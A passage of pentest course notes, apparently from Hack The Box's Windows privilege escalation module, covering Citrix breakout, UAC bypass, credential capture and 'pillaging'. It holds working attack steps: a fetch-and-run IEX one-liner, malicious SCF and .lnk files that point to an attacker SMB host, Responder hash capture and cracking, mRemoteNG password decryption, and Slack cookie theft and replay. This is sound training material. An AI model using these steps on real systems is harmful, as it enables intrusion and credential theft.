AlwaysInstallElevated\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n\t\tAlwaysInstallElevated    REG_DWORD    0x1\n```\n\nOnce more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.\n\nCitrix Breakout\n\n```powershell-session\nPS C:\\Users\\pmorgan\\Desktop> Import-Module .\\PowerUp.ps1\nPS C:\\Users\\pmorgan\\Desktop> Write-UserAddMSI\n\t\nOutput Path\n-----------\nUserAdd.msi\n```\n\nNow we can execute `UserAdd.msi` and create a new user `backdoor:T3st@123` under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.\n\n![File Explorer window showing Desktop. 'User Add' dialog open with fields: Username 'backdoor', Password 'T3st@123', Group 'Administrators'. Create button visible.](https://academy.hackthebox.com/storage/modules/67/useradd.png)\n\nBack in CMD execute `runas` to start command prompt as the newly created `backdoor` user.\n\nCitrix Breakout\n\n```cmd-session\nC:\\> runas /user:backdoor cmd\n\nEnter the password for backdoor: T3st@123\nAttempting to start cmd as user \"VDESKTOP3\\backdoor\" ...\n```\n\n---\n\n## Bypassing UAC\n\nEven though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\\users\\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.\n\nCitrix Breakout\n\n```cmd-session\nC:\\Windows\\system32> cd C:\\Users\\Administrator\n\nAccess is denied.\n```\n\nNumerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.\n\nCitrix Breakout\n\n```powershell-session\nPS C:\\Users\\Public> Import-Module .\\Bypass-UAC.ps1\nPS C:\\Users\\Public> Bypass-UAC -Method UacMethodSysprep\n```\n\n![Command prompt running as VDESKTOP3\\backdoor with PowerShell bypass. Script imports Bypass-UAC.ps1 and executes UacMethodSysprep. Outputs include impersonating explorer.exe, dropping proxy DLL, and executing sysprep.](https://academy.hackthebox.com/storage/modules/67/bypass_uac.png)\n\nFollowing a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command `whoami /all` or `whoami /priv`. This command provides a comprehensive view of the current user's privileges. And we can now access the Administrator directory.\n\n![Command prompt showing directory listing of C:\\Users\\Administrator\\Desktop with file flag.txt, size 19 bytes. 'whoami' command output: vdesktop3\\backdoor.](https://academy.hackthebox.com/storage/modules/67/flag.png)\n\nNote: Wait for 5 minutes after spawning the target. Disregard the licensing message.\n\n#### Additional resources worth checking:\n\n- [Breaking out of Citrix and other Restricted Desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)\n- [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/26-Interacting with Users",
    "path": "02_CPTS/17-Windows Privilege Escalation/26-Interacting with Users.md",
    "title": "26 Interacting With Users",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Interacting with Users --- Users are sometimes the weakest link in an organization. An overloaded employee working quickly may not notice something is \"off\" on their machine when browsing a shared dri...",
    "category": "02_CPTS",
    "content": "# Interacting with Users\n\n---\n\nUsers are sometimes the weakest link in an organization. An overloaded employee working quickly may not notice something is \"off\" on their machine when browsing a shared drive, clicking on a link, or running a file. As discussed throughout this module, Windows presents us with an enormous attack surface, and there are many things to check for when enumerating local privilege escalation vectors. Once we have exhausted all options, we can look at specific techniques to steal credentials from an unsuspecting user by sniffing their network traffic/local commands or attacking a known vulnerable service requiring user interaction. One of my favorite techniques is placing malicious files around heavily accessed file shares in an attempt to retrieve user password hashes to crack offline later.\n\n---\n\n## Traffic Capture\n\nIf `Wireshark` is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.\n\n![Npcap 0.9986 Setup window with installation options: Legacy loopback support, Restrict driver's access to Administrators, Support raw 802.11 traffic, and Install in WinPcap API-compatible mode. No options selected.](https://academy.hackthebox.com/storage/modules/67/pcap.png)\n\nHere we can see a rough example of capturing cleartext FTP credentials entered by another user while signed into the same box. While not highly likely, if `Wireshark` is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up.\n\n![Wireshark capture showing FTP traffic between IPs 10.129.43.8 and 10.129.43.7. Includes responses and requests like '220-FileZilla Server', 'USER root', and 'PASS FTP_adm1n!'.](https://academy.hackthebox.com/storage/modules/67/ftp.png)\n\nAlso, suppose our client positions us on an attack machine within the environment. In that case, it is worth running `tcpdump` or `Wireshark` for a while to see what types of traffic are being passed over the wire and if we can see anything interesting. The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file. It is worth letting this tool run in the background during an assessment or running it against a pcap to see if we can extract any credentials useful for privilege escalation or lateral movement.\n\n---\n\n## Process Command Lines\n\n#### Monitoring for Process Command Lines\n\nWhen getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.\n\n```shell-session\nwhile($true)\n{\n\n  $process = Get-WmiObject Win32_Process | Select-Object CommandLine\n  Start-Sleep 1\n  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine\n  Compare-Object -ReferenceObject $process -DifferenceObject $process2\n\n}\n```\n\n#### Running Monitor Script on Target Host\n\nWe can host the script on our attack machine and execute it on the target host as follows.\n\n```powershell-session\nPS C:\\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') \n\nInputObject                                           SideIndicator\n-----------                                           -------------\n@{CommandLine=C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      \n@{CommandLine=“C:\\Windows\\system32\\cmd.exe” }                          =>      \n@{CommandLine=\\??\\C:\\Windows\\system32\\conhost.exe 0x4}                      =>      \n@{CommandLine=net use T: \\\\sql02\\backups /user:inlanefreight\\sqlsvc My4dm1nP@s5w0Rd}       =>       \n@{CommandLine=“C:\\Windows\\system32\\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=\n```\n\nThis is successful and reveals the password for the `sqlsvc` domain user, which we could then possibly use to gain access to the SQL02 host or potentially find sensitive data such as database credentials on the `backups` share.\n\n---\n\n## Vulnerable Services\n\nWe may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction. [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) is a great example of this. This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1. When this particular version of Docker starts, it looks for several different files, including `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., which do not exist with a Docker installation. The program looks for these files in the `C:\\PROGRAMDATA\\DockerDesktop\\version-bin\\`. This directory was misconfigured to allow full write access to the `BUILTIN\\Users` group, meaning that any authenticated user on the system could write a file into it (such as a malicious executable).\n\nAny executable placed in that directory would run when a) the Docker application starts and b) when a user authenticates using the command `docker login`. While a bit older, it is not outside the realm of possibility to encounter a developer's workstation running this version of Docker Desktop, hence why it is always important to thoroughly enumerate installed software. While this particular flaw wouldn't guarantee us elevated access (since it relies on a service restart or user action), we could plant our executable during a long-term assessment and periodically check if it runs and our privileges are elevated.\n\n---\n\n## SCF on a File Share\n\nA Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.\n\n#### Malicious SCF File\n\nIn this example, let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.\n\n```shell-session\n[Shell]\nCommand=2\nIconFile=\\\\10.10.14.3\\share\\legit.ico\n[Taskbar]\nCommand=ToggleDesktop\n```\n\n#### Starting Responder\n\nNext, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.\n\n```shell-session\n[!bash!]$ sudo responder -wrf -v -I tun0\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.0.2.0\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    DNS/MDNS                   [ON]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [ON]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    RDP server                 [ON]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [OFF]\n    Force WPAD auth            [OFF]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Fingerprint hosts          [ON]\n\n[+] Generic Options:\n    Responder NIC              [tun2]\n    Responder IP               [10.10.14.3]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP']\n\n\n\n[!] Error starting SSL server on port 443, check permissions or other servers running.\n[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 10.129.43.30\n[SMB] NTLMv2-SSP Username : WINLPE-SRV01\\Administrator\n[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...\n```\n\n#### Cracking NTLMv2 Hash with Hashcat\n\nWe could then attempt to crack this password hash offline using `Hashcat` to retrieve the cleartext.\n\n```shell-session\n[!bash!]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt\n\nhashcat (v6.1.1) starting...\n\n<SNIP>\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Welcome1\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: NetNTLMv2\nHash.Target......: ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3...000000\nTime.Started.....: Thu May 27 19:16:18 2021 (1 sec)\nTime.Estimated...: Thu May 27 19:16:19 2021 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  1233.7 kH/s (2.74ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 43008/14344385 (0.30%)\nRejected.........: 0/43008 (0.00%)\nRestore.Point....: 36864/14344385 (0.26%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: holabebe -> harder\n\nStarted: Thu May 27 19:16:16 2021\nStopped: Thu May 27 19:16:20 2021\n```\n\nNote: In our example, wait 2-5 minutes for the \"user\" to browse the share after starting Responder.\n\n---\n\n## Capturing Hashes with a Malicious .lnk File\n\nUsing SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:\n\n#### Generating a Malicious .lnk File\n\n```powershell-session\n\n$objShell = New-Object -ComObject WScript.Shell\n$lnk = $objShell.CreateShortcut(\"C:\\legit.lnk\")\n$lnk.TargetPath = \"\\\\<attackerIP>\\@pwn.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"Browsing to the directory where this file is saved will trigger an auth request.\"\n$lnk.HotKey = \"Ctrl+Alt+O\"\n$lnk.Save()\n```\n\nTry out this technique on the target host to familiarize yourself with the methodology and add another tactic to your arsenal for when you encounter environments where Server 2019 is prevalent.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/27-Pillaging",
    "path": "02_CPTS/17-Windows Privilege Escalation/27-Pillaging.md",
    "title": "27 Pillaging",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Pillaging --- Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure an...",
    "category": "02_CPTS",
    "content": "# Pillaging\n\n---\n\nPillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.\n\nThese data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.\n\n---\n\n## Data Sources\n\nBelow are some of the sources from which we can obtain information from compromised systems:\n\n- Installed applications\n- Installed services\n    - Websites\n    - File Shares\n    - Databases\n    - Directory Services (such as Active Directory, Azure AD, etc.)\n    - Name Servers\n    - Deployment Services\n    - Certificate Authority\n    - Source Code Management Server\n    - Virtualization\n    - Messaging\n    - Monitoring and Logging Systems\n    - Backups\n- Sensitive Data\n    - Keylogging\n    - Screen Capture\n    - Network Traffic Capture\n    - Previous Audit reports\n- User Information\n    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)\n    - Roles and Privileges\n    - Web Browsers\n    - IM Clients\n\nThis is not a complete list. Anything that can provide information about our target will be valuable. Depending on the business size, purpose, and scope, we may find different information. Knowledge and familiarity with commonly used applications, server software, and middleware are essential, as most applications store their data in various formats and locations. Special tools may be necessary to obtain, extract or read the targeted data from some systems.\n\nDuring the following sections, we will discuss and practice some aspects of Pillaging in Windows.\n\n---\n\n## Scenario\n\nLet's assume that we have gained a foothold on the Windows server mentioned in the below network and start collecting as much information as possible.\n\n![Network diagram showing connections: Pentester to Windows Server, which connects to a Router. Router links to two Switches, File Server, and Backup Servers. Switches connect to Domain Controller and Database Servers. Printer connected to Windows Server.](https://academy.hackthebox.com/storage/modules/67/network.png)\n\n---\n\n## Installed Applications\n\nUnderstanding which applications are installed on our compromised system may help us achieve our goal during a pentest. It's important to know that every pentest is different. We may encounter a lot of unknown applications on the systems we compromised. Learning and understanding how these applications connect to the business are essential to achieving our goal.\n\nWe will also find typical applications such as Office, remote management systems, IM clients, etc. We can use `dir` or `ls` to check the content of `Program Files` and `Program Files (x86)` to find which applications are installed. Although there may be other apps on the computer, this is a quick way to review them.\n\n#### Identifying Common Applications\n\nPillaging\n\n```cmd-session\nC:\\>dir \"C:\\Program Files\"\n Volume in drive C has no label.\n Volume Serial Number is 900E-A7ED\n\n Directory of C:\\Program Files\n\n07/14/2022  08:31 PM    <DIR>          .\n07/14/2022  08:31 PM    <DIR>          ..\n05/16/2022  03:57 PM    <DIR>          Adobe\n05/16/2022  12:33 PM    <DIR>          Corsair\n05/16/2022  10:17 AM    <DIR>          Google\n05/16/2022  11:07 AM    <DIR>          Microsoft Office 15\n07/10/2022  11:30 AM    <DIR>          mRemoteNG\n07/13/2022  09:14 AM    <DIR>          OpenVPN\n07/19/2022  09:04 PM    <DIR>          Streamlabs OBS\n07/20/2022  07:06 AM    <DIR>          TeamViewer\n               0 File(s)              0 bytes\n              16 Dir(s)  351,524,651,008 bytes free\n```\n\nAn alternative is to use PowerShell and read the Windows registry to collect more granular information about installed programs.\n\n#### Get Installed Programs via PowerShell & Registry Keys\n\nPillaging\n\n```powershell-session\nPS C:\\htb> $INSTALLED = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |  Select-Object DisplayName, DisplayVersion, InstallLocation\nPS C:\\htb> $INSTALLED += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation\nPS C:\\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize\n\nDisplayName                                         DisplayVersion    InstallLocation\n-----------                                         --------------    ---------------\nAdobe Acrobat DC (64-bit)                           22.001.20169      C:\\Program Files\\Adobe\\Acrobat DC\\\nCORSAIR iCUE 4 Software                             4.23.137          C:\\Program Files\\Corsair\\CORSAIR iCUE 4 Software\nGoogle Chrome                                       103.0.5060.134    C:\\Program Files\\Google\\Chrome\\Application\nGoogle Drive                                        60.0.2.0          C:\\Program Files\\Google\\Drive File Stream\\60.0.2.0\\GoogleDriveFS.exe\nMicrosoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\\Program Files (x86)\\Microsoft Office\nMicrosoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\\Program Files (x86)\\Microsoft Office\nmRemoteNG                                           1.62              C:\\Program Files\\mRemoteNG\nTeamViewer                                          15.31.5           C:\\Program Files\\TeamViewer\n...SNIP...\n```\n\nWe can see the `mRemoteNG` software is installed on the system. [mRemoteNG](https://mremoteng.org) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let's take a look at `mRemoteNG`.\n\n#### mRemoteNG\n\n`mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.\n\nBy default, the configuration file is located in `%USERPROFILE%\\APPDATA\\Roaming\\mRemoteNG`.\n\n#### Discover mRemoteNG Configuration Files\n\nPillaging\n\n```powershell-session\nPS C:\\htb> ls C:\\Users\\julio\\AppData\\Roaming\\mRemoteNG\n\n    Directory: C:\\Users\\julio\\AppData\\Roaming\\mRemoteNG\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        7/21/2022   8:51 AM                Themes\n-a----        7/21/2022   8:51 AM            340 confCons.xml\n              7/21/2022   8:51 AM            970 mRemoteNG.log\n```\n\nLet's look at the contents of the `confCons.xml` file.\n\n#### mRemoteNG Configuration File - confCons.xml\n\nCode: xml\n\n```xml\n<?XML version=\"1.0\" encoding=\"utf-8\"?>\n<mrng:Connections xmlns:mrng=\"http://mremoteng.org\" Name=\"Connections\" Export=\"false\" EncryptionEngine=\"AES\" BlockCipherMode=\"GCM\" KdfIterations=\"1000\" FullFileEncryption=\"false\" Protected=\"QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe\" ConfVersion=\"2.6\">\n    <Node Name=\"RDP_Domain\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\" Id=\"096332c1-f405-4e1e-90e0-fd2a170beeb5\" Username=\"administrator\" Domain=\"test.local\" Password=\"sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==\" Hostname=\"10.0.0.10\" Protocol=\"RDP\" PuttySession=\"Default Settings\" Port=\"3389\"\n    ..SNIP..\n</Connections>\n```\n\nThis XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master password used to encrypt the document. We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.\n\nAs mentioned previously, if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.\n\n#### Decrypt the Password with mremoteng_decrypt\n\nPillaging\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 mremoteng_decrypt.py -s \"sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==\" \n\nPassword: ASDki230kasd09fk233aDA\n```\n\nNow let's look at an encrypted configuration file with a custom password. For this example, we set the custom password `admin`.\n\n#### mRemoteNG Configuration File - confCons.xml\n\nCode: xml\n\n```xml\n<?XML version=\"1.0\" encoding=\"utf-8\"?>\n<mrng:Connections xmlns:mrng=\"http://mremoteng.org\" Name=\"Connections\" Export=\"false\" EncryptionEngine=\"AES\" BlockCipherMode=\"GCM\" KdfIterations=\"1000\" FullFileEncryption=\"false\" Protected=\"1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG\" ConfVersion=\"2.6\">\n    <Node Name=\"RDP_Domain\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\" Id=\"096332c1-f405-4e1e-90e0-fd2a170beeb5\" Username=\"administrator\" Domain=\"test.local\" Password=\"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==\" Hostname=\"10.0.0.10\" Protocol=\"RDP\" PuttySession=\"Default Settings\" Port=\"3389\" ConnectToConsole=\"False\" \n    \n<SNIP>\n</Connections>\n```\n\nIf we attempt to decrypt the `Password` attribute from the node `RDP_Domain`, we will get the following error.\n\n#### Attempt to Decrypt the Password with a Custom Password\n\nPillaging\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 mremoteng_decrypt.py -s \"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==\"\n\nTraceback (most recent call last):\n  File \"/home/plaintext/htb/academy/mremoteng_decrypt.py\", line 49, in <module>\n    main()\n  File \"/home/plaintext/htb/academy/mremoteng_decrypt.py\", line 45, in main\n    plaintext = cipher.decrypt_and_verify(ciphertext, tag)\n  File \"/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py\", line 567, in decrypt_and_verify\n    self.verify(received_mac_tag)\n  File \"/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py\", line 508, in verify\n    raise ValueError(\"MAC check failed\")\nValueError: MAC check failed\n```\n\nIf we use the custom password, we can decrypt it.\n\n#### Decrypt the Password with mremoteng_decrypt and a Custom Password\n\nPillaging\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 mremoteng_decrypt.py -s \"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==\" -p admin\n\nPassword: ASDki230kasd09fk233aDA\n```\n\nIn case we want to attempt to crack the password, we can modify the script to try multiple passwords from a file, or we can create a Bash `for loop`. We can attempt to crack the `Protected` attribute or the `Password` itself. If we try to crack the `Protected` attribute once we find the correct password, the result will be `Password: ThisIsProtected`. If we try to crack the `Password` directly, the result will be `Password: <PASSWORD>`.\n\n#### For Loop to Crack the Master Password with mremoteng_decrypt\n\nPillaging\n\n```shell-session\ndrxh3kr@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s \"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==\" -p $password 2>/dev/null;done    \n                              \nSpring2017\nSpring2016\nadmin\nPassword: ASDki230kasd09fk233aDA\nadmin admin          \nadmins\n\n<SNIP>\n```\n\n---\n\n## Abusing Cookies to Get Access to IM Clients\n\nWith the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like `Slack` and `Microsoft Teams` have become staples of modern office communications. These applications help in improving collaboration between co-workers and teams. If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.\n\nThere are multiple options to gain access to an IM Client; one standard method is to use the user's credentials to get into the cloud version of the instant messaging application as the regular user would.\n\nIf the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.\n\nThere are often tools that may help us automate the process, but as the cloud and applications constantly evolve, we may find these applications out of date, and we still need to find a way to gather information from the IM clients. Understanding how to abuse credentials, cookies, and tokens is often helpful in accessing web applications such as IM Clients.\n\nLet's use `Slack` as an example. Multiple posts refer to how to abuse `Slack` such as [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). We can use them to understand better how Slack tokens and cookies work, but keep in mind that `Slack's` behavior may have changed since the release of those posts.\n\nThere's also a tool called [SlackExtract](https://github.com/clr2of8/SlackExtract) released in 2018, which was able to extract `Slack` messages. Their research discusses the cookie named `d`, which `Slack` uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.\n\n##### Cookie Extraction from Firefox\n\nFirefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\\Mozilla\\Firefox\\Profiles\\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.\n\n#### Copy Firefox Cookies Database\n\nPillaging\n\n```powershell-session\nPS C:\\htb> copy $env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cookies.sqlite .\n```\n\nWe can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.\n\n#### Extract Slack Cookie from Firefox Cookies Database\n\nPillaging\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 cookieextractor.py --dbpath \"/home/plaintext/cookies.sqlite\" --host slack --cookie d\n\n(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)\n```\n\nNow that we have the cookie, we can use any browser extension to add the cookie to our browser. For this example, we will use Firefox and the extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/). Make sure to install the extension by clicking the link, selecting your browser, and adding the extension. Once the extension is installed, you will see something like this:\n\n![Mozilla Firefox in Private Browsing mode. Cookie Editor open, displaying message: 'This page does not have any cookies.' Options include Show Advanced, add, delete, and export cookies.](https://academy.hackthebox.com/storage/modules/67/cookie-editor-extension.jpg)\n\nOur target website is `slack.com`. Now that we have the cookie, we want to impersonate the user. Let's navigate to slack.com once the page loads, click on the icon for the Cookie-Editor extension, and modify the value of the `d` cookie with the value you have from the cookieextractor.py script. Make sure to click the save icon (marked in red in the image below).\n\n![Mozilla Firefox on Slack page with Cookie Editor open. Cookie 'd' selected, showing value 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSC...'.](https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg)\n\nOnce you have saved the cookie, you can refresh the page and see that you are logged in as the user.\n\n![Slack page in Firefox Private Browsing. Message: 'Welcome back'. Workspace for plaintexthackthebox@gmail.com listed as 'Inlanefreight' with 2 members. 'Launch Slack' button visible.](https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg)\n\nNow we are logged in as the user and can click on `Launch Slack`. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie `d` with the same value we used to gain access the first time on any website that asks us for information or credentials.\n\n![Slack sign-in page for Inlanefreight with options to sign in using Google or Apple. Email and password fields visible. Cookie Editor open, showing cookie 'd' with a long value.](https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg)\n\nOnce we complete this process for every website where we get a prompt, we need to refresh the browser, click on `Launch Slack` and use Slack in the browser.\n\nAfter gaining access, we can use built-in functions to search for common words like passwords, credentials, PII, or any other information relevant to our assessment.\n\n![Slack search results for 'creds' in Inlanefreight workspace. Messages from plaintexthackthebox in #general channel: 'Hello José, I'll give you the 